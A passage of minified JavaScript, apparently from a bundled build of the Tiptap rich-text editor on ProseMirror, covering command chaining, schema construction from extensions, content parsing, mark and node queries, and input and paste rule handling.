Pu(i.doc.resolve(r.$from.pos),i.doc.resolve(o),r.depth));const a=_s(r);if(a==null)return!1;i.lift(r,a);let l=i.doc.resolve(i.mapping.map(s,-1)-1);return Vr(i.doc,l.pos)&&l.nodeBefore.type==l.nodeAfter.type&&i.join(l.pos),e(i.scrollIntoView()),!0}function FF(t,e,n){let r=t.tr,i=n.parent;for(let h=n.end,p=n.endIndex-1,y=n.startIndex;p>y;p--)h-=i.child(p).nodeSize,r.delete(h-1,h+1);let s=r.doc.resolve(n.start),o=s.nodeAfter;if(r.mapping.map(n.end)!=n.start+s.nodeAfter.nodeSize)return!1;let a=n.startIndex==0,l=n.endIndex==i.childCount,u=s.node(-1),c=s.index(-1);if(!u.canReplace(c+(a?0:1),c+1,o.content.append(l?A.empty:A.from(i))))return!1;let d=s.pos,f=d+o.nodeSize;return r.step(new Fe(d-(a?1:0),f+(l?1:0),d+1,f-1,new L((a?A.empty:A.from(i.copy(A.empty))).append(l?A.empty:A.from(i.copy(A.empty))),a?0:1,l?0:1),a?0:1)),e(r.scrollIntoView()),!0}function BF(t){return function(e,n){let{$from:r,$to:i}=e.selection,s=r.blockRange(i,u=>u.childCount>0&&u.firstChild.type==t);if(!s)return!1;let o=s.startIndex;if(o==0)return!1;let a=s.parent,l=a.child(o-1);if(l.type!=t)return!1;if(n){let u=l.lastChild&&l.lastChild.type==a.type,c=A.from(u?t.create():null),d=new L(A.from(t.create(null,A.from(a.type.create(null,c)))),u?3:1,0),f=s.start,h=s.end;n(e.tr.step(new Fe(f-(u?3:1),h,f,h,d,1,!0)).scrollIntoView())}return!0}}var VF=Object.defineProperty,bE=(t,e)=>{for(var n in e)VF(t,n,{get:e[n],enumerable:!0})};function Qc(t){const{state:e,transaction:n}=t;let{selection:r}=n,{doc:i}=n,{storedMarks:s}=n;return{...e,apply:e.apply.bind(e),applyTransaction:e.applyTransaction.bind(e),plugins:e.plugins,schema:e.schema,reconfigure:e.reconfigure.bind(e),toJSON:e.toJSON.bind(e),get storedMarks(){return s},get selection(){return r},get doc(){return i},get tr(){return r=n.selection,i=n.doc,s=n.storedMarks,n}}}var Xc=class{constructor(t){this.editor=t.editor,this.rawCommands=this.editor.extensionManager.commands,this.customState=t.state}get hasCustomState(){return!!this.customState}get state(){return this.customState||this.editor.state}get commands(){const{rawCommands:t,editor:e,state:n}=this,{view:r}=e,{tr:i}=n,s=this.buildProps(i);return Object.fromEntries(Object.entries(t).map(([o,a])=>[o,(...u)=>{const c=a(...u)(s);return!i.getMeta("preventDispatch")&&!this.hasCustomState&&r.dispatch(i),c}]))}get chain(){return()=>this.createChain()}get can(){return()=>this.createCan()}createChain(t,e=!0){const{rawCommands:n,editor:r,state:i}=this,{view:s}=r,o=[],a=!!t,l=t||i.tr,u=()=>(!a&&e&&!l.getMeta("preventDispatch")&&!this.hasCustomState&&s.dispatch(l),o.every(d=>d===!0)),c={...Object.fromEntries(Object.entries(n).map(([d,f])=>[d,(...p)=>{const y=this.buildProps(l,e),x=f(...p)(y);return o.push(x),c}])),run:u};return c}createCan(t){const{rawCommands:e,state:n}=this,r=!1,i=t||n.tr,s=this.buildProps(i,r);return{...Object.fromEntries(Object.entries(e).map(([a,l])=>[a,(...u)=>l(...u)({...s,dispatch:void 0})])),chain:()=>this.createChain(i,r)}}buildProps(t,e=!0){const{rawCommands:n,editor:r,state:i}=this,{view:s}=r,o={tr:t,editor:r,view:s,state:Qc({state:i,transaction:t}),dispatch:e?()=>{}:void 0,chain:()=>this.createChain(t,e),can:()=>this.createCan(t),get commands(){return Object.fromEntries(Object.entries(n).map(([a,l])=>[a,(...u)=>l(...u)(o)]))}};return o}},zF=class{constructor(){this.callbacks={}}on(t,e){return this.callbacks[t]||(this.callbacks[t]=[]),this.callbacks[t].push(e),this}emit(t,...e){const n=this.callbacks[t];return n&&n.forEach(r=>r.apply(this,e)),this}off(t,e){const n=this.callbacks[t];return n&&(e?this.callbacks[t]=n.filter(r=>r!==e):delete this.callbacks[t]),this}once(t,e){const n=(...r)=>{this.off(t,n),e.apply(this,r)};return this.on(t,n)}removeAllListeners(){this.callbacks={}}};function CE(t,e){const n=new DC(t);return e.forEach(r=>{r.steps.forEach(i=>{n.step(i)})}),n}var EE=t=>{const e=t.childNodes;for(let n=e.length-1;n>=0;n-=1){const r=e[n];r.nodeType===3&&r.nodeValue&&/^(\n\s\s|\n)$/.test(r.nodeValue)?t.removeChild(r):r.nodeType===1&&EE(r)}return t};function pl(t){if(typeof window>"u")throw new Error("[tiptap error]: there is no window object available, so this function cannot be used");const e=`<body>${t}</body>`,n=new window.DOMParser().parseFromString(e,"text/html").body;return EE(n)}function ya(t,e,n){if(t instanceof sn||t instanceof A)return t;n={slice:!0,parseOptions:{},...n};const r=typeof t=="object"&&t!==null,i=typeof t=="string";if(r)try{if(Array.isArray(t)&&t.length>0)return A.fromArray(t.map(a=>e.nodeFromJSON(a)));const o=e.nodeFromJSON(t);return n.errorOnInvalidContent&&o.check(),o}catch(s){if(n.errorOnInvalidContent)throw new Error("[tiptap error]: Invalid JSON content",{cause:s});return console.warn("[tiptap warn]: Invalid content.","Passed value:",t,"Error:",s),ya("",e,n)}if(i){if(n.errorOnInvalidContent){let o=!1,a="";const l=new yC({topNode:e.spec.topNode,marks:e.spec.marks,nodes:e.spec.nodes.append({__tiptap__private__unknown__catch__all__node:{content:"inline*",group:"block",parseDOM:[{tag:"*",getAttrs:u=>(o=!0,a=typeof u=="string"?u:u.outerHTML,null)}]}})});if(n.slice?Er.fromSchema(l).parseSlice(pl(t),n.parseOptions):Er.fromSchema(l).parse(pl(t),n.parseOptions),n.errorOnInvalidContent&&o)throw new Error("[tiptap error]: Invalid HTML content",{cause:new Error(`Invalid element found: ${a}`)})}const s=Er.fromSchema(e);return n.slice?s.parseSlice(pl(t),n.parseOptions).content:s.parse(pl(t),n.parseOptions)}return ya("",e,n)}function up(t,e,n={},r={}){return ya(t,e,{slice:!1,parseOptions:n,errorOnInvalidContent:r.errorOnInvalidContent})}function _F(t){for(let e=0;e<t.edgeCount;e+=1){const{type:n}=t.edge(e);if(n.isTextblock&&!n.hasRequiredAttrs())return n}return null}function $F(t,e,n){const r=[];return t.nodesBetween(e.from,e.to,(i,s)=>{n(i)&&r.push({node:i,pos:s})}),r}function HF(t,e){for(let n=t.depth;n>0;n-=1){const r=t.node(n);if(e(r))return{pos:n>0?t.before(n):0,start:t.start(n),depth:n,node:r}}}function Zc(t){return e=>HF(e.$from,t)}function F(t,e,n){return t.config[e]===void 0&&t.parent?F(t.parent,e,n):typeof t.config[e]=="function"?t.config[e].bind({...n,parent:t.parent?F(t.parent,e,n):null}):t.config[e]}function Ng(t){return t.map(e=>{const n={name:e.name,options:e.options,storage:e.storage},r=F(e,"addExtensions",n);return r?[e,...Ng(r())]:e}).flat(10)}function Ag(t,e){const n=Ai.fromSchema(e).serializeFragment(t),i=document.implementation.createHTMLDocument().createElement("div");return i.appendChild(n),i.innerHTML}function TE(t){return typeof t=="function"}function X(t,e=void 0,...n){return TE(t)?e?t.bind(e)(...n):t(...n):t}function UF(t={}){return Object.keys(t).length===0&&t.constructor===Object}function xa(t){const e=t.filter(i=>i.type==="extension"),n=t.filter(i=>i.type==="node"),r=t.filter(i=>i.type==="mark");return{baseExtensions:e,nodeExtensions:n,markExtensions:r}}function ME(t){const e=[],{nodeExtensions:n,markExtensions:r}=xa(t),i=[...n,...r],s={default:null,validate:void 0,rendered:!0,renderHTML:null,parseHTML:null,keepOnSplit:!0,isRequired:!1};return t.forEach(o=>{const a={name:o.name,options:o.options,storage:o.storage,extensions:i},l=F(o,"addGlobalAttributes",a);if(!l)return;l().forEach(c=>{c.types.forEach(d=>{Object.entries(c.attributes).forEach(([f,h])=>{e.push({type:d,name:f,attribute:{...s,...h}})})})})}),i.forEach(o=>{const a={name:o.name,options:o.options,storage:o.storage},l=F(o,"addAttributes",a);if(!l)return;const u=l();Object.entries(u).forEach(([c,d])=>{const f={...s,...d};typeof(f==null?void 0:f.default)=="function"&&(f.default=f.default()),f!=null&&f.isRequired&&(f==null?void 0:f.default)===void 0&&delete f.default,e.push({type:o.name,name:c,attribute:f})})}),e}function Me(...t){return t.filter(e=>!!e).reduce((e,n)=>{const r={...e};return Object.entries(n).forEach(([i,s])=>{if(!r[i]){r[i]=s;return}if(i==="class"){const a=s?String(s).split(" "):[],l=r[i]?r[i].split(" "):[],u=a.filter(c=>!l.includes(c));r[i]=[...l,...u].join(" ")}else if(i==="style"){const a=s?s.split(";").map(c=>c.trim()).filter(Boolean):[],l=r[i]?r[i].split(";").map(c=>c.trim()).filter(Boolean):[],u=new Map;l.forEach(c=>{const[d,f]=c.split(":").map(h=>h.trim());u.set(d,f)}),a.forEach(c=>{const[d,f]=c.split(":").map(h=>h.trim());u.set(d,f)}),r[i]=Array.from(u.entries()).map(([c,d])=>`${c}: ${d}`).join("; ")}else r[i]=s}),r},{})}function Bu(t,e){return e.filter(n=>n.type===t.type.name).filter(n=>n.attribute.rendered).map(n=>n.attribute.renderHTML?n.attribute.renderHTML(t.attrs)||{}:{[n.name]:t.attrs[n.name]}).reduce((n,r)=>Me(n,r),{})}function WF(t){return typeof t!="string"?t:t.match(/^[+-]?(?:\d*\.)?\d+$/)?Number(t):t==="true"?!0:t==="false"?!1:t}function Uv(t,e){return"style"in t?t:{...t,getAttrs:n=>{const r=t.getAttrs?t.getAttrs(n):t.attrs;if(r===!1)return!1;const i=e.reduce((s,o)=>{const a=o.attribute.parseHTML?o.attribute.parseHTML(n):WF(n.getAttribute(o.name));return a==null?s:{...s,[o.name]:a}},{});return{...r,...i}}}}function Wv(t){return Object.fromEntries(Object.entries(t).filter(([e,n])=>e==="attrs"&&UF(n)?!1:n!=null))}function KF(t,e){var n;const r=ME(t),{nodeExtensions:i,markExtensions:s}=xa(t),o=(n=i.find(u=>F(u,"topNode")))==null?void 0:n.name,a=Object.fromEntries(i.map(u=>{const c=r.filter(g=>g.type===u.name),d={name:u.name,options:u.options,storage:u.storage,editor:e},f=t.reduce((g,v)=>{const w=F(v,"extendNodeSchema",d);return{...g,...w?w(u):{}}},{}),h=Wv({...f,content:X(F(u,"content",d)),marks:X(F(u,"marks",d)),group:X(F(u,"group",d)),inline:X(F(u,"inline",d)),atom:X(F(u,"atom",d)),selectable:X(F(u,"selectable",d)),draggable:X(F(u,"draggable",d)),code:X(F(u,"code",d)),whitespace:X(F(u,"whitespace",d)),linebreakReplacement:X(F(u,"linebreakReplacement",d)),defining:X(F(u,"defining",d)),isolating:X(F(u,"isolating",d)),attrs:Object.fromEntries(c.map(g=>{var v,w;return[g.name,{default:(v=g==null?void 0:g.attribute)==null?void 0:v.default,validate:(w=g==null?void 0:g.attribute)==null?void 0:w.validate}]}))}),p=X(F(u,"parseHTML",d));p&&(h.parseDOM=p.map(g=>Uv(g,c)));const y=F(u,"renderHTML",d);y&&(h.toDOM=g=>y({node:g,HTMLAttributes:Bu(g,c)}));const x=F(u,"renderText",d);return x&&(h.toText=x),[u.name,h]})),l=Object.fromEntries(s.map(u=>{const c=r.filter(x=>x.type===u.name),d={name:u.name,options:u.options,storage:u.storage,editor:e},f=t.reduce((x,g)=>{const v=F(g,"extendMarkSchema",d);return{...x,...v?v(u):{}}},{}),h=Wv({...f,inclusive:X(F(u,"inclusive",d)),excludes:X(F(u,"excludes",d)),group:X(F(u,"group",d)),spanning:X(F(u,"spanning",d)),code:X(F(u,"code",d)),attrs:Object.fromEntries(c.map(x=>{var g,v;return[x.name,{default:(g=x==null?void 0:x.attribute)==null?void 0:g.default,validate:(v=x==null?void 0:x.attribute)==null?void 0:v.validate}]}))}),p=X(F(u,"parseHTML",d));p&&(h.parseDOM=p.map(x=>Uv(x,c)));const y=F(u,"renderHTML",d);return y&&(h.toDOM=x=>y({mark:x,HTMLAttributes:Bu(x,c)})),[u.name,h]}));return new yC({topNode:o,nodes:a,marks:l})}function qF(t){const e=t.filter((n,r)=>t.indexOf(n)!==r);return Array.from(new Set(e))}function Pg(t){return t.sort((n,r)=>{const i=F(n,"priority")||100,s=F(r,"priority")||100;return i>s?-1:i<s?1:0})}function NE(t){const e=Pg(Ng(t)),n=qF(e.map(r=>r.name));return n.length&&console.warn(`[tiptap warn]: Duplicate extension names found: [${n.map(r=>`'${r}'`).join(", ")}]. This can lead to issues.`),e}function AE(t,e,n){const{from:r,to:i}=e,{blockSeparator:s=`

`,textSerializers:o={}}=n||{};let a="";return t.nodesBetween(r,i,(l,u,c,d)=>{var f;l.isBlock&&u>r&&(a+=s);const h=o==null?void 0:o[l.type.name];if(h)return c&&(a+=h({node:l,pos:u,parent:c,index:d,range:e})),!1;l.isText&&(a+=(f=l==null?void 0:l.text)==null?void 0:f.slice(Math.max(r,u)-u,i-u))}),a}function GF(t,e){const n={from:0,to:t.content.size};return AE(t,n,e)}function PE(t){return Object.fromEntries(Object.entries(t.nodes).filter(([,e])=>e.spec.toText).map(([e,n])=>[e,n.spec.toText]))}function Jn(t,e){if(typeof t=="string"){if(!e.marks[t])throw Error(`There is no mark type named '${t}'. Maybe you forgot to add the extension?`);return e.marks[t]}return t}function RE(t,e){const n=Jn(e,t.schema),{from:r,to:i,empty:s}=t.selection,o=[];s?(t.storedMarks&&o.push(...t.storedMarks),o.push(...t.selection.$head.marks())):t.doc.nodesBetween(r,i,l=>{o.push(...l.marks)});const a=o.find(l=>l.type.name===n.name);return a?{...a.attrs}:{}}function Ne(t,e){if(typeof t=="string"){if(!e.nodes[t])throw Error(`There is no node type named '${t}'. Maybe you forgot to add the extension?`);return e.nodes[t]}return t}function JF(t,e){const n=Ne(e,t.schema),{from:r,to:i}=t.selection,s=[];t.doc.nodesBetween(r,i,a=>{s.push(a)});const o=s.reverse().find(a=>a.type.name===n.name);return o?{...o.attrs}:{}}function ed(t,e){return e.nodes[t]?"node":e.marks[t]?"mark":null}function OE(t,e){const n=ed(typeof e=="string"?e:e.name,t.schema);return n==="node"?JF(t,e):n==="mark"?RE(t,e):{}}function YF(t,e=JSON.stringify){const n={};return t.filter(r=>{const i=e(r);return Object.prototype.hasOwnProperty.call(n,i)?!1:n[i]=!0})}function QF(t){const e=YF(t);return e.length===1?e:e.filter((n,r)=>!e.filter((s,o)=>o!==r).some(s=>n.oldRange.from>=s.oldRange.from&&n.oldRange.to<=s.oldRange.to&&n.newRange.from>=s.newRange.from&&n.newRange.to<=s.newRange.to))}function DE(t){const{mapping:e,steps:n}=t,r=[];return e.maps.forEach((i,s)=>{const o=[];if(i.ranges.length)i.forEach((a,l)=>{o.push({from:a,to:l})});else{const{from:a,to:l}=n[s];if(a===void 0||l===void 0)return;o.push({from:a,to:l})}o.forEach(({from:a,to:l})=>{const u=e.slice(s).map(a,-1),c=e.slice(s).map(l),d=e.invert().map(u,-1),f=e.invert().map(c);r.push({oldRange:{from:d,to:f},newRange:{from:u,to:c}})})}),QF(r)}function Rg(t){return Object.prototype.toString.call(t)==="[object RegExp]"}function Vu(t,e,n={strict:!0}){const r=Object.keys(e);return r.length?r.every(i=>n.strict?e[i]===t[i]:Rg(e[i])?e[i].test(t[i]):e[i]===t[i]):!0}function LE(t,e,n={}){return t.find(r=>r.type===e&&Vu(Object.fromEntries(Object.keys(n).map(i=>[i,r.attrs[i]])),n))}function Kv(t,e,n={}){return!!LE(t,e,n)}function Og(t,e,n){var r;if(!t||!e)return;let i=t.parent.childAfter(t.parentOffset);if((!i.node||!i.node.marks.some(c=>c.type===e))&&(i=t.parent.childBefore(t.parentOffset)),!i.node||!i.node.marks.some(c=>c.type===e)||(n=n||((r=i.node.marks[0])==null?void 0:r.attrs),!LE([...i.node.marks],e,n)))return;let o=i.index,a=t.start()+i.offset,l=o+1,u=a+i.node.nodeSize;for(;o>0&&Kv([...t.parent.child(o-1).marks],e,n);)o-=1,a-=t.parent.child(o).nodeSize;for(;l<t.parent.childCount&&Kv([...t.parent.child(l).marks],e,n);)u+=t.parent.child(l).nodeSize,l+=1;return{from:a,to:u}}function Dg(t,e,n){const r=[];return t===e?n.resolve(t).marks().forEach(i=>{const s=n.resolve(t),o=Og(s,i.type);o&&r.push({mark:i,...o})}):n.nodesBetween(t,e,(i,s)=>{!i||(i==null?void 0:i.nodeSize)===void 0||r.push(...i.marks.map(o=>({from:s,to:s+i.nodeSize,mark:o})))}),r}var XF=(t,e,n,r=20)=>{const i=t.doc.resolve(n);let s=r,o=null;for(;s>0&&o===null;){const a=i.node(s);(a==null?void 0:a.type.name)===e?o=a:s-=1}return[o,s]};function gf(t,e){return e.nodes[t]||e.marks[t]||null}function Wl(t,e,n){return Object.fromEntries(Object.entries(n).filter(([r])=>{const i=t.find(s=>s.type===e&&s.name===r);return i?i.attribute.keepOnSplit:!1}))}var ZF=(t,e=500)=>{let n="";const r=t.parentOffset;return t.parent.nodesBetween(Math.max(0,r-e),r,(i,s,o,a)=>{var l,u;const c=((u=(l=i.type.spec).toText)==null?void 0:u.call(l,{node:i,pos:s,parent:o,index:a}))||i.textContent||"%leaf%";n+=i.isAtom&&!i.isText?c:c.slice(0,Math.max(0,r-s))}),n};function cp(t,e,n={}){const{empty:r,ranges:i}=t.selection,s=e?Jn(e,t.schema):null;if(r)return!!(t.storedMarks||t.selection.$from.marks()).filter(d=>s?s.name===d.type.name:!0).find(d=>Vu(d.attrs,n,{strict:!1}));let o=0;const a=[];if(i.forEach(({$from:d,$to:f})=>{const h=d.pos,p=f.pos;t.doc.nodesBetween(h,p,(y,x)=>{if(!y.isText&&!y.marks.length)return;const g=Math.max(h,x),v=Math.min(p,x+y.nodeSize),w=v-g;o+=w,a.push(...y.marks.map(b=>({mark:b,from:g,to:v})))})}),o===0)return!1;const l=a.filter(d=>s?s.name===d.mark.type.name:!0).filter(d=>Vu(d.mark.attrs,n,{strict:!1})).reduce((d,f)=>d+f.to-f.from,0),u=a.filter(d=>s?d.mark.type!==s&&d.mark.type.excludes(s):!0).reduce((d,f)=>d+f.to-f.from,0);return(l>0?l+u:l)>=o}function Lr(t,e,n={}){const{from:r,to:i,empty:s}=t.selection,o=e?Ne(e,t.schema):null,a=[];t.doc.nodesBetween(r,i,(d,f)=>{if(d.isText)return;const h=Math.max(r,f),p=Math.min(i,f+d.nodeSize);a.push({node:d,from:h,to:p})});const l=i-r,u=a.filter(d=>o?o.name===d.node.type.name:!0).filter(d=>Vu(d.node.attrs,n,{strict:!1}));return s?!!u.length:u.reduce((d,f)=>d+f.to-f.from,0)>=l}function eB(t,e,n={}){if(!e)return Lr(t,null,n)||cp(t,null,n);const r=ed(e,t.schema);return r==="node"?Lr(t,e,n):r==="mark"?cp(t,e,n):!1}var tB=(t,e)=>{const{$from:n,$to:r,$anchor:i}=t.selection;if(e){const s=Zc(a=>a.type.name===e)(t.selection);if(!s)return!1;const o=t.doc.resolve(s.pos+1);return i.pos+1===o.end()}return!(r.parentOffset<r.parent.nodeSize-2||n.pos!==r.pos)},nB=t=>{const{$from:e,$to:n}=t.selection;return!(e.parentOffset>0||e.pos!==n.pos)};function qv(t,e){return Array.isArray(e)?e.some(n=>(typeof n=="string"?n:n.name)===t.name):e}function Gv(t,e){const{nodeExtensions:n}=xa(e),r=n.find(o=>o.name===t);if(!r)return!1;const i={name:r.name,options:r.options,storage:r.storage},s=X(F(r,"group",i));return typeof s!="string"?!1:s.split(" ").includes("list")}function td(t,{checkChildren:e=!0,ignoreWhitespace:n=!1}={}){var r;if(n){if(t.type.name==="hardBreak")return!0;if(t.isText)return/^\s*$/m.test((r=t.text)!=null?r:"")}if(t.isText)return!t.text;if(t.isAtom||t.isLeaf)return!1;if(t.content.childCount===0)return!0;if(e){let i=!0;return t.content.forEach(s=>{i!==!1&&(td(s,{ignoreWhitespace:n,checkChildren:e})||(i=!1))}),i}return!1}function IE(t){return t instanceof V}function jE(t){return t instanceof $}function ni(t=0,e=0,n=0){return Math.min(Math.max(t,e),n)}function FE(t,e=null){if(!e)return null;const n=W.atStart(t),r=W.atEnd(t);if(e==="start"||e===!0)return n;if(e==="end")return r;const i=n.from,s=r.to;return e==="all"?$.create(t,ni(0,i,s),ni(t.content.size,i,s)):$.create(t,ni(e,i,s),ni(e,i,s))}function rB(t,e,n){const r=t.steps.length-1;if(r<e)return;const i=t.steps[r];if(!(i instanceof Ie||i instanceof Fe))return;const s=t.mapping.maps[r];let o=0;s.forEach((a,l,u,c)=>{o===0&&(o=c)}),t.setSelection(W.near(t.doc.resolve(o),n))}var nd=class{constructor(t){this.find=t.find,this.handler=t.handler}},iB=(t,e)=>{if(Rg(e))return e.exec(t);const n=e(t);if(!n)return null;const r=[n.text];return r.index=n.index,r.input=t,r.data=n.data,n.replaceWith&&(n.text.includes(n.replaceWith)||console.warn('[tiptap warn]: "inputRuleMatch.replaceWith" must be part of "inputRuleMatch.text".'),r.push(n.replaceWith)),r};function ml(t){var e;const{editor:n,from:r,to:i,text:s,rules:o,plugin:a}=t,{view:l}=n;if(l.composing)return!1;const u=l.state.doc.resolve(r);if(u.parent.type.spec.code||(e=u.nodeBefore||u.nodeAfter)!=null&&e.marks.find(f=>f.type.spec.code))return!1;let c=!1;const d=ZF(u)+s;return o.forEach(f=>{if(c)return;const h=iB(d,f.find);if(!h)return;const p=l.state.tr,y=Qc({state:l.state,transaction:p}),x={from:r-(h[0].length-s.length),to:i},{commands:g,chain:v,can:w}=new Xc({editor:n,state:y});f.handler({state:y,range:x,match:h,commands:g,chain:v,can:w})===null||!p.steps.length||(p.setMeta(a,{transform:p,from:r,to:i,text:s}),l.dispatch(p),c=!0)}),c}function sB(t){const{editor:e,rules:n}=t,r=new we({state:{init(){return null},apply(i,s,o){const a=i.getMeta(r);if(a)return a;const l=i.getMeta("applyInputRules");return!!l&&setTimeout(()=>{let{text:c}=l;typeof c=="string"?c=c:c=Ag(A.from(c),o.schema);const{from:d}=l,f=d+c.length;ml({editor:e,from:d,to:f,text:c,rules:n,plugin:r})}),i.selectionSet||i.docChanged?null:s}},props:{handleTextInput(i,s,o,a){return ml({editor:e,from:s,to:o,text:a,rules:n,plugin:r})},handleDOMEvents:{compositionend:i=>(setTimeout(()=>{const{$cursor:s}=i.state.selection;s&&ml({editor:e,from:s.pos,to:s.pos,text:"",rules:n,plugin:r})}),!1)},handleKeyDown(i,s){if(s.key!=="Enter")return!1;const{$cursor:o}=i.state.selection;return o?ml({editor:e,from:o.pos,to:o.pos,text:`
`,rules:n,plugin:r}):!1}},isInputRules:!0});return r}function oB(t){return Object.prototype.toString.call(t).slice(8,-1)}function gl(t){return oB(t)!=="Object"?!1:t.constructor===Object&&Object.getPrototypeOf(t)===Object.prototype}function BE(t,e){const n={...t};return gl(t)&&gl(e)&&Object.keys(e).forEach(r=>{gl(e[r])&&gl(t[r])?n[r]=BE(t[r],e[r]):n[r]=e[r]}),n}var Lg=class{constructor(t={}){this.type="extendable",this.parent=null,this.child=null,this.name="",this.config={name:this.name},this.config={...this.config,...t},this.name=this.config.name}get options(){return{...X(F(this,"addOptions",{name:this.name}))||{}}}get storage(){return{...X(F(this,"addStorage",{name:this.name,options:this.options}))||{}}}configure(t={}){const e=this.extend({...this.config,addOptions:()=>BE(this.options,t)});return e.name=this.name,e.parent=this.parent,e}extend(t={}){const e=new this.constructor({...this.config,...t});return e.parent=this,this.child=e,e.name="name"in t?t.name:e.parent.name,e}},Pi=class VE extends Lg{constructor(){super(...arguments),this.type="mark"}static create(e={}){const n=typeof e=="function"?e():e;return new VE(n)}static handleExit({editor:e,mark:n}){const{tr:r}=e.state,i=e.state.selection.$from;if(i.pos===i.end()){const o=i.marks();if(!!!o.find(u=>(u==null?void 0:u.type.name)===n.name))return!1;const l=o.find(u=>(u==null?void 0:u.type.name)===n.name);return l&&r.removeStoredMark(l),r.insertText(" ",i.pos),e.view.dispatch(r),!0}return!1}configure(e){return super.configure(e)}extend(e){const n=typeof e=="function"?e():e;return super.extend(n)}};function aB(t){return typeof t=="number"}var lB=class{constructor(t){this.find=t.find,this.handler=t.handler}},uB=(t,e,n)=>{if(Rg(e))return[...t.matchAll(e)];const r=e(t,n);return r?r.map(i=>{const s=[i.text];return s.index=i.index,s.input=t,s.data=i.data,i.replaceWith&&(i.text.includes(i.replaceWith)||console.warn('[tiptap warn]: "pasteRuleMatch.replaceWith" must be part of "pasteRuleMatch.text".'),s.push(i.replaceWith)),s}):[]};function cB(t){const{editor:e,state:n,from:r,to:i,rule:s,pasteEvent:o,dropEvent:a}=t,{commands:l,chain:u,can:c}=new Xc({editor:e,state:n}),d=[];return n.doc.nodesBetween(r,i,(h,p)=>{var y,x,g,v,w;if((x=(y=h.type)==null?void 0:y.spec)!=null&&x.code||!(h.isText||h.isTextblock||h.isInline))return;const b=(w=(v=(g=h.content)==null?void 0:g.size)!=null?v:h.nodeSize)!=null?w:0,k=Math.max(r,p),E=Math.min(i,p+b);if(k>=E)return;const M=h.isText?h.text||"":h.textBetween(k-p,E-p,void 0,"");uB(M,s.find,o).forEach(N=>{if(N.index===void 0)return;const O=k+N.index+1,H=O+N[0].length,pe={from:n.tr.mapping.map(O),to:n.tr.mapping.map(H)},Pe=s.handler({state:n,range:pe,match:N,commands:l,chain:u,can:c,pasteEvent:o,dropEvent:a});d.push(Pe)})}),d.every(h=>h!==null)}var yl=null,dB=t=>{var e;const n=new ClipboardEvent("paste",{clipboardData:new DataTransfer});return(e=n.clipboardData)==null||e.setData("text/html",t),n};function fB(t){const{editor:e,rules:n}=t;let r=null,i=!1,s=!1,o=typeof ClipboardEvent<"u"?new ClipboardEvent("paste"):null,a;try{a=typeof DragEvent<"u"?new DragEvent("drop"):null}catch{a=null}const l=({state:c,from:d,to:f,rule:h,pasteEvt:p})=>{const y=c.tr,x=Qc({state:c,transaction:y});if(!(!cB({editor:e,state:x,from:Math.max(d-1,0),to:f.b-1,rule:h,pasteEvent:p,dropEvent:a})||!y.steps.length)){try{a=typeof DragEvent<"u"?new DragEvent("drop"):null}catch{a=null}return o=typeof ClipboardEvent<"u"?new ClipboardEvent("paste"):null,y}};return n.map(c=>new we({view(d){const f=p=>{var y;r=(y=d.dom.parentElement)!=null&&y.contains(p.target)?d.dom.parentElement:null,r&&(yl=e)},h=()=>{yl&&(yl=null)};return window.addEventListener("dragstart",f),window.addEventListener("dragend",h),{destroy(){window.removeEventListener("dragstart",f),window.removeEventListener("dragend",h)}}},props:{handleDOMEvents:{drop:(d,f)=>{if(s=r===d.dom.parentElement,a=f,!s){const h=yl;h!=null&&h.isEditable&&setTimeout(()=>{const p=h.state.selection;p&&h.commands.deleteRange({from:p.from,to:p.to})},10)}return!1},paste:(d,f)=>{var h;const p=(h=f.clipboardData)==null?void 0:h.getData("text/html");return o=f,i=!!(p!=null&&p.includes("data-pm-slice")),!1}}},appendTransaction:(d,f,h)=>{const p=d[0],y=p.getMeta("uiEvent")==="paste"&&!i,x=p.getMeta("uiEvent")==="drop"&&!s,g=p.getMeta("applyPasteRules"),v=!!g;if(!y&&!x&&!v)return;if(v){let{text:k}=g;typeof k=="string"?k=k:k=Ag(A.from(k),h.schema);const{from:E}=g,M=E+k.length,C=dB(k);return l({rule:c,state:h,from:E,to:{b:M},pasteEvt:C})}const w=f.doc.content.findDiffStart(h.doc.content),b=f.doc.content.findDiffEnd(h.doc.content);if(!(!aB(w)||!b||w===b.b))return l({rule:c,state:h,from:w,to:b,pasteEvt:o})}}))}var rd=class{constructor(t,e){this.splittableMarks=[],this.editor=e,this.extensions=NE(t),this.schema=KF(this.extensions,e),this.setupExtensions()}get commands(){return this.extensions.reduce((t,e)=>{const n={name:e.name,options:e.options,storage:this.editor.extensionStorage[e.name],editor:this.editor,type:gf(e.name,this.schema)},r=F(e,"addCommands",n);return r?{...t,...r()}:t},{})}get plugins(){const{editor:t}=this;return Pg([...this.extensions].reverse()).map(r=>{const i={name:r.name,options:r.options,storage:this.editor.extensionStorage[r.name],editor:t,type:gf(r.name,this.schema)},s=[],o=F(r,"addKeyboardShortcuts",i);let a={};if(r.type==="mark"&&F(r,"exitable",i)&&(a.ArrowRight=()=>Pi.handleExit({editor:t,mark:r})),o){const f=Object.fromEntries(Object.entries(o()).map(([h,p])=>[h,()=>p({editor:t})]));a={...a,...f}}const l=fF(a);s.push(l);const u=F(r,"addInputRules",i);if(qv(r,t.options.enableInputRules)&&u){const f=u();if(f&&f.length){const h=sB({editor:t,rules:f}),p=Array.isArray(h)?h:[h];s.push(...p)}}const c=F(r,"addPasteRules",i);if(qv(r,t.options.enablePasteRules)&&c){const f=c();if(f&&f.length){const h=fB({editor:t,rules:f});s.push(...h)}}const d=F(r,"addProseMirrorPlugins",i);if(d){const f=d();s.push(...f)}return s}).flat()}get attributes(){return ME(this.extensions)}get nodeViews(){const{editor:t}=this,{nodeExtensions:e}=xa(this.extensions);return Object.fromEntries(e.filter(n=>!!F(n,"addNodeView")).map(n=>{const r=this.attributes.filter(a=>a.type===n.name),i={name:n.name,options:n.options,storage:this.editor.extensionStorage[n.name],editor:t,type:Ne(n.name,this.schema)},s=F(n,"addNodeView",i);if(!s)return[];const o=(a,l,u,c,d)=>{const f=Bu(a,r);return s()({node:a,view:l,getPos:u,decorations:c,innerDecorations:d,editor:t,extension:n,HTMLAttributes:f})};return[n.name,o]}))}get markViews(){const{editor:t}=this,{markExtensions:e}=xa(this.extensions);return Object.fromEntries(e.filter(n=>!!F(n,"addMarkView")).map(n=>{const r=this.attributes.filter(a=>a.type===n.name),i={name:n.name,options:n.options,storage:this.editor.extensionStorage[n.name],editor:t,type:Jn(n.name,this.schema)},s=F(n,"addMarkView",i);if(!s)return[];const o=(a,l,u)=>{const c=Bu(a,r);return s()({mark:a,view:l,inline:u,editor:t,extension:n,HTMLAttributes:c,updateAttributes:d=>{NV(a,t,d)}})};return[n.name,o]}))}setupExtensions(){const 